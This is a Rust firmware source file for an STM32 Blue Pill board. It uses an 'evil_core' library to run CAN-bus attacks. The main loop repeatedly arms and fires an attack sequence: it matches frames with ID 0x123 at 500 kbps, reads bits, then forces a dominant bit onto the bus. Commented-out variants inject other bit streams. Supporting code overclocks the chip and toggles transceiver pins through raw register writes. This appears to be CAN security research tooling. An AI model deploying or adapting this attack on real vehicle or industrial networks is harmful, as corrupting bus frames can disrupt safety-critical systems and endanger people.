#![no_std]
#![no_main]

mod bluepill;
mod soft_timer;
mod spi;
mod spi_device;
use evil_core::{
    clock::TicksClock, tranceiver::Tranceiver, AttackCmd, BitStream, CanBitrates, EvilBsp, EvilCore, FastBitQueue
};

use {defmt_rtt as _, panic_probe as _};
use defmt::info;
use embassy_executor::Spawner;
use embassy_stm32::{gpio::{Input, Level, Output, Pull, Speed}, pac::{flash::vals::Latency, rcc::vals::Pllsrc}, rcc::{AHBPrescaler, APBPrescaler, PllMul, Sysclk}};
use embassy_time::Timer;
use embassy_stm32::pac;

// Function to set PLL multiplier to 16 for 128 MHz (HSE = 8 MHz)
pub fn overclock() {
    // Access RCC and FLASH registers
    let rcc = pac::RCC;
    let flash = pac::FLASH;

    // Step 1: Enable HSI and switch to HSI (8 MHz)
    rcc.cr().modify(|w| w.set_hsion(true));
    while !rcc.cr().read().hsirdy() {} // Wait for HSI ready
    rcc.cfgr().modify(|w| w.set_sw(Sysclk::HSI)); // SYSCLK = HSI
    while rcc.cfgr().read().sws().to_bits() != 0 {} // Wait for switch

    // Step 2: Disable PLL
    rcc.cr().modify(|w| w.set_pllon(false));
    while rcc.cr().read().pllrdy() {} // Wait for PLL to stop

    // Step 3: Enable HSE and configure PLL
    rcc.cr().modify(|w| w.set_hseon(true)); // Enable HSE (8 MHz)
    while !rcc.cr().read().hserdy() {} // Wait for HSE ready
    rcc.cfgr().modify(|w| {
        w.set_pllsrc(Pllsrc::HSE_DIV_PREDIV); // PLL source = HSE
        w.set_pllmul(PllMul::MUL16); // PLL multiplier = 16
        w.set_hpre(AHBPrescaler::DIV1); // AHB prescaler = DIV1 (HCLK = 128 MHz)
        w.set_ppre1(APBPrescaler::DIV4); // APB1 prescaler = DIV4 (PCLK1 = 32 MHz)
        w.set_ppre2(APBPrescaler::DIV2); // APB2 prescaler = DIV2 (PCLK2 = 64 MHz)
    });

    // Step 4: Update Flash latency (3 wait states for 128 MHz, extrapolated)
    flash.acr().modify(|w| w.set_latency(Latency::_RESERVED_3));

    // Step 5: Enable PLL and switch to PLL
    rcc.cr().modify(|w| w.set_pllon(true));
    while !rcc.cr().read().pllrdy() {} // Wait for PLL ready
    rcc.cfgr().modify(|w| w.set_sw(Sysclk::PLL1_P)); // SYSCLK = PLL
    while rcc.cfgr().read().sws() != Sysclk::PLL1_P {} // Wait for switch
}

#[embassy_executor::task]
async fn blink_task(mut led: Output<'static>) {
    loop {
        led.set_high();
        Timer::after_millis(300).await;

        led.set_low();
        Timer::after_millis(300).await;
    }
}


struct SystickClock {
    _systick: cortex_m::peripheral::SYST,
}

impl SystickClock {
    pub fn new(mut systick: cortex_m::peripheral::SYST) -> Self {
        // Configure SysTick
        systick.set_clock_source(cortex_m::peripheral::syst::SystClkSource::Core);

        // Set reload value (maximum 24-bit value)
        systick.set_reload(0x00FFFFFF);

        // Clear current value by writing any value to CVR
        systick.clear_current();

        // Enable counter
        systick.enable_counter();


        Self { _systick: systick }
    }
}

impl TicksClock for SystickClock {
    const TICKS_PER_SEC: u32 = 128_000_000;

    fn ticks(&self) -> u32 {
        0xFFFFFF - unsafe { core::ptr::read_volatile(0xE000E018 as *const u32) }
    }

    fn add_ticks(t1: u32, t2: u32) -> u32 {
        (t1 + t2) % 0x1000000
    }
}


struct BpTr<'a> {
    _tx: Output<'a>,
    _rx: Input<'a>,
    _force: Output<'a>,
}

impl<'a> BpTr<'a> {
    pub fn new(tx: Output<'a>, rx: Input<'a>, force: Output<'a>) -> Self {
        BpTr { _tx: tx, _rx: rx, _force: force }
    }
}

impl<'a> Tranceiver for BpTr<'a> {
    fn set_tx(&mut self, state: bool) {
        // Direct memory access for GPIOA ODR (PA10, bit 10)
        const GPIOA_ODR: *mut u32 = 0x4001_080C as *mut u32;
        unsafe {
            let current = core::ptr::read_volatile(GPIOA_ODR);
            if state {
                // Set PA10 high
                core::ptr::write_volatile(GPIOA_ODR, current | (1 << 10));
            } else {
                // Set PA10 low
                core::ptr::write_volatile(GPIOA_ODR, current & !(1 << 10));
            }
        }    }

    fn get_rx(&self) -> bool {
        // Direct memory access for GPIOA IDR (PA9, bit 9)
        const GPIOA_IDR: *const u32 = 0x4001_0808 as *const u32;
        unsafe {
            // Read PA9 (bit 9) and check if it's high
            (core::ptr::read_volatile(GPIOA_IDR) & (1 << 9)) != 0
        }
    }

    fn set_force(&mut self, state: bool) {
        const GPIOA_ODR: *mut u32 = 0x4001_080C as *mut u32;
        unsafe {
            let current = core::ptr::read_volatile(GPIOA_ODR);
            if state {
                // Set PA11 high
                core::ptr::write_volatile(GPIOA_ODR, current | (1 << 11));
            } else {
                // Set PA11 low
                core::ptr::write_volatile(GPIOA_ODR, current & !(1 << 11));
            }
        }
    }
}


#[embassy_executor::main]
async fn main(spawner: Spawner) {
    let p = bluepill::init();

    overclock();

    let led = Output::new(p.PC13, Level::High, Speed::Low);
    spawner.spawn(blink_task(led)).unwrap();

    let tx = Output::new(p.PA10, Level::High, Speed::VeryHigh);
    let rx = Input::new(p.PA9, Pull::Up);
    let force = Output::new(p.PA11, Level::Low, Speed::VeryHigh);

    let tranceiver = BpTr::new(tx, rx, force);


    // Delay for the MCP2515
    // let delay = SoftTimer {};

    // Setup SPI
    // let spi = create_default_spi!(p);

    let cp = cortex_m::Peripherals::take().unwrap();
    let systick = SystickClock::new(cp.SYST);

    // let bsp: EvilBsp<_, _> = EvilBsp::new_with_mcp2515(spi, delay, systick, tranceiver);
    let bsp: EvilBsp<_, _> = EvilBsp::new(systick, tranceiver);

    info!("BSP created");

    // Create and run the Doggie core
    let mut core = EvilCore::new(bsp, CanBitrates::Kbps500, 1400);

    info!("Core created");


    Timer::after_millis(100).await;


    loop {
    
        core.arm(
            &[

                AttackCmd::Wait { bits: 1 },
                AttackCmd::Match { stream: FastBitQueue::new(0x123, 11) },
                AttackCmd::Wait { bits: 3 },
                AttackCmd::Read { len: 4 },
                AttackCmd::WaitBuffered,
                AttackCmd::Wait { bits: 16 },
                AttackCmd::Force { stream: FastBitQueue::new(0x1, 1) },



                // AttackCmd::Wait { bits: 1 },
                // AttackCmd::Match { stream: BitStream::from_u32(0x123, 11) },
                // AttackCmd::Wait { bits: 39 },
                // AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },

                // AttackCmd::Wait { bits: 10 },
                // AttackCmd::Wait { bits: 9 },
                // AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
                // AttackCmd::Force { stream: BitStream::from_u32(0b10101010101, 11) },
            ]
        ).unwrap();

        Timer::after_millis(800).await;

        info!("Attack armed");

        cortex_m::interrupt::free(
            |_| {
                core.attack();
            }
        );

        info!("Attack has finished");

    }
}
